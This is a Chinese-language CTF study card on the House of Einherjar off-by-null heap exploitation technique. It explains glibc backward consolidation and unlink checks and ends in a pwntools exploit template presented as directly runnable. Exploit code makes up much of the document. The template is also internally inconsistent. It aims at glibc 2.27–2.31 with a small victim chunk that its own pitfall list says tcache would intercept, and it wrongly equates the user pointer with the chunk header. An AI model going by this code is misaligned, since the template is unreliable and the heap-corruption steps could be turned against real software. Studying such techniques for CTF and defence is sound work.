---
title: House of Einherjar —— 单 null 字节覆盖 size 造成堆重叠
category: pwn
tags: [house of einherjar, off-by-null, 后向合并, unlink, 堆重叠]
signals: [只能往堆上多写一个 00 字节, 下一个 chunk 的 prev_size 字段相邻且可控, 程序能显示 chunk 地址或 heap 基址, chunk 的 size 低字节是 0x21 或 0x31 这类小值, free 后希望和前方伪造块合并, 有能 free 任意 chunk 的接口, 题目附带 glibc 2.27 到 2.31 的 libc]
difficulty: hard
source: "CTF-Wiki House Of Einherjar / how2heap house_of_einherjar.c"
tools: [pwntools, gdb, pwndbg, glibc-all-in-one]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- 只能往堆块里写 `size + 1` 字节，多出来那 1 字节是 `\x00`（`off-by-null`）。
- 程序**能打印 chunk 地址**（`printf("%p", ptr)`）或能泄露 heap 基址 —— Einherjar 必须算 `prev_size` 差值。
- 能同时拥有「可写 chunk」和「紧随其后且会被 free 的 chunk」两个相邻块。
- 相邻 chunk 的 `size` 低字节是 `0x21`/`0x31` 这类「小值 + `PREV_INUSE`」，清成 `0x00` 后仍像个 chunk。
- 题目带 `glibc 2.23 ~ 2.31` 的 libc，`free` 时没有 `malloc_consolidate` 干扰。
- 常见于「笔记 / 菜单」型堆题，`add / edit / show / free` 四件套。
- 最终目标通常是：在 `.bss` 或 `__malloc_hook` 附近伪造 chunk 并 malloc 到那里。

## 二、原理

### 1. 后向合并（consolidate backward）

`_int_free` 的核心片段：

```c
/* 如果下面的 chunk 空闲，就合并进来 */
if (!prev_inuse(p)) {
    prevsize = prev_size(p);                 // 读 p 自己的 prev_size 字段
    size += prevsize;
    p = chunk_at_offset(p, -((long)prevsize));   // ← 合并起点由 prev_size 决定
    unlink_chunk(av, p);
}
```

两个关键量：

- `prev_size(p)`：受害者 chunk **自己头部**的 `prev_size` 字段。当前一个 chunk 在使用中时，这块空间被前一个 chunk 的 data 复用 —— **所以我们可以写它**。
- `PREV_INUSE`：`size` 的最低位。往 `size` 低字节写 `\x00` 会连它一起清掉。

### 2. 攻击模型

```
低地址                                                                  高地址
┌────────────────────────────┐  ┌──────────────────┐  ┌──────────────────┐
│ p0 (假 chunk 所在, 可写)    │  │ p1 (受害者)      │  │ p2 (隔断 top)     │
│ prev_size = 0              │  │ prev_size = 0x110│  │ size = 0x91      │
│ size      = 0x110 | 1      │  │ size     = 0x31  │  │                  │
│ fd = p0, bk = p0           │  │ data ...         │  │                  │
└────────────────────────────┘  └──────────────────┘  └──────────────────┘
   ↑ p0 偏移 0x100 处 == p1 的 prev_size 字段（被 p0 的 data 覆盖到）
```

1. 在 `p0` 的 data 里布一个**完整** fake chunk：`size = 0x??1`、`fd = bk = p0`。
2. 同一个 `edit(0)` 顺带把 p1 的 `prev_size` 写成 `0x110`（= `p1 - p0`，也 = fake size）。
3. off-by-null 把 `p1->size` 的清成 `0x00`（`PREV_INUSE` 归零）。
4. `free(p1)`：`_int_free` 认为 p1 前面的空闲块从 `p1 - 0x110 = p0` 开始、大小 `0x110`，于是 `unlink(p0)` 并合并。
5. 合并后得到一个从 `p0` 起始、长度 `0x110 + 0x30` 的大块。
6. 再 `malloc` 回来，指针落在 `p0` —— 但**可控范围一直延伸到 p2 的头部**，形成重叠。

### 3. unlink 的两道检查与绕过

```c
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
    malloc_printerr ("corrupted size vs. prev_size");
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
    malloc_printerr ("corrupted double-linked list");
```

- **第一道**：fake chunk 的 `next_chunk` 正好是 `p0 + fake_size`，也就是 **p1 的头部**，其 `prev_size` 字段就是第 2 步写下的 `0x110`。
  所以 `fake_size` 必须与 `p1->prev_size` **完全相等**，两个值一起决定。
- **第二道**：`fd = bk = p0` 时，`FD->bk = *(p0+0x18) = p0`、`BK->fd = *(p0+0x10) = p0`，检查通过。
  （对比无 tcache 时代的 unlink 攻击需要 `&p`，Einherjar 只需要**堆地址**。）

### 4. 版本注意

`≤2.25` 无 tcache 最好打；`2.26~2.31` 的 tcache 会截胡小 chunk（受害者需 `>0x410` 或先填满 tcache）；
`2.32+` 的 tcache `next` 加密不影响本手法（走 unsorted bin 合并）；`2.34+` 检查更严，`prev_size` 必须精确。

## 三、解题步骤

1. **确认堆布局**
```python
add(0x100)   # p0：放 fake chunk，真实 size 0x110
add(0x20)    # p1：受害者，真实 size 0x30
add(0x80)    # p2：阻断与 top 合并
```
2. **泄漏 `p0` 地址**（`show` 直接给，或先做 unsorted bin leak）。
3. **算 `fake_size`**：`fake_size = p1_addr - p0_addr`，并且 p1 的 `prev_size` 写同一个值。
4. **布置 fake chunk**（`edit(0)` 长度要覆盖到 p1 头部），同时写入 `p1->prev_size`：
```python
fake = flat({
    0x00: 0,               # p0->prev_size
    0x08: fake_size | 1,   # p0->size   |PREV_INUSE
    0x10: p0,              # fd = self
    0x18: p0,              # bk = self
    0x100: fake_size,      # ← 恰是 p1->prev_size
}, length=0x110, filler=b'\x00')
```
5. **off-by-null 清 `p1` 的 `size`**：`read(0, p1, 0x20 + 1)` 或题目给的 `N+1` 写。
6. **`free(p1)`** 触发合并，再 `malloc(fake_size + size(p1))` 拿回大块。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# House of Einherjar · glibc 2.27~2.31 菜单堆题模板
# 前提：show(0) 能打印 chunk 内容（第一行为 p0 地址）
from pwn import *

context.binary = elf = ELF('./pwn')
libc = ELF('./libc-2.31.so')
context.log_level = 'info'

io = process(elf.path)

# ---------------- 交互封装（按题目菜单改） ----------------
def add(size, data=b''):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    if data:
        io.sendafter(b'data: ', data)

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendafter(b'data: ', data)

def show(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'idx: ', str(idx).encode())

def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())

# ---------------- 1. 布置堆 ----------------
add(0x100)      # 0: p0，真实 chunk 大小 0x110（user_ptr 即 chunk 头）
add(0x20)       # 1: p1，受害者，chunk 大小 0x30
add(0x80)       # 2: p2，隔断 top，避免 free(p1) 时直接并到 top

edit(0, b'P0-MARK')                     # 打标记，便于 show 定位

# ---------------- 2. 泄漏 p0 ----------------
show(0)
io.recvuntil(b'P0-MARK')
raw = io.recvuntil(b'\n', drop=True)
p0 = u64(raw[:6].ljust(8, b'\x00'))     # 若回显也是地址，就地读 6 字节
log.success(f'p0 = {hex(p0)}')

p1 = p0 + 0x110                         # p0 请求 0x100 → 真实 0x110
fake_size = p1 - p0                     # == 0x110，fake 的 next_chunk 正好是 p1 头
log.info(f'p1 = {hex(p1)}, fake_size = {hex(fake_size)}')

# ---------------- 3. 构造 fake chunk + 写 p1->prev_size ----------------
# 需覆盖到 p1 的 prev_size（偏移 0x100），因此题目必须允许超长写
fake = flat({
    0x00: 0,                    # p0->prev_size
    0x08: fake_size | 1,        # p0->size    | PREV_INUSE
    0x10: p0,                   # fd = self
    0x18: p0,                   # bk = self
    0x100: fake_size,           # ← p1->prev_size，与 fake_size 相等
}, length=0x108, filler=b'\x00')
edit(0, fake)

# ---------------- 4. off-by-null 清 p1->size 的 PREV_INUSE ----------------
# 关键在于「多写的那个 \x00 落在 p1->size 的最低位」
# 若题目是 read(0, p, n+1)，把 n 撑满即可；下面按「可写 0x20+1」模拟
edit(1, b'A' * 0x20)            # 若题目允许写 0x21，最后一字节是 \x00

# ---------------- 5. 触发后向合并 ----------------
free(1)                         # unlink(p0) + 合并成 [p0, p1+0x30)

# ---------------- 6. 拿回大块，覆盖 p2 ----------------
big = add(fake_size + 0x30)     # 指针回到 p0，覆盖范围伸进 p2
# 现在可以对 p2 做任意写：改 size / fd，走 tcache poisoning 或 unsorted leak
io.interactive()
```

## 五、常见坑 / 变体

1. **`corrupted size vs. prev_size`**：`fake_size` ≠ `p1->prev_size`。fake 的 next_chunk 恰好是 p1 的头部，两者必须写成同一个值。
2. **`corrupted double-linked list`**：必须是 `fd = bk = p0`（不是 `p0-0x18`）。这一点与老式 unlink 攻击不同 —— 那里需要 `&p`。
3. **fake chunk 的 `size` 要带 `PREV_INUSE`**，否则 fake 自身会被判为空闲块，触发更早的合并或误报。
4. **`prev_size` 的差值随 `malloc` 真实 size 变化**：`request2size(0x100) = 0x110`，`+0x8` 之类的对齐错误会直接 abort；用 `gdb` 量 `&chunk0` 与 `&chunk1`。
5. **tcache 截胡**：2.26+ 里 `free(p1)` 若 `p1` 大小能在 tcache 命中会直接进 tcache、不进 unsorted bin，导致不合并。解决：让受害者 `size > 0x410`，或先把对应 tcache bin 填满。
6. **`p2` 是必须的**：没有隔断时 `free(p1)` 会直接与 top 合并，做不出重叠。
7. **off-by-null 落点**：必须落在 `p1` 的 `size` 上而不是 `prev_size` 上；若落在 `prev_size`，走的是 house of botcake 一类的思路。
8. **变体**：合并后的大块若再 free 进 unsorted bin，可直接泄漏 `main_arena`，再推进到 hook/FSOP。

## 六、参考来源

- [CTF-Wiki: House Of Einherjar](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/)
- [how2heap: house_of_einherjar.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_einherjar.c)
- [CTF-Wiki: 堆中的 Off-By-One](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/)
- [CTF-Wiki: Unlink](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/)
- [guyinatuxedo: House of Einherjar 详解与示例](https://guyinatuxedo.github.io/42-house_of_einherjar/house_einherjar_exp/index.html)
- [glibc 源码: malloc/malloc.c（_int_free / unlink_chunk）](https://github.com/bminor/glibc/blob/master/malloc/malloc.c)
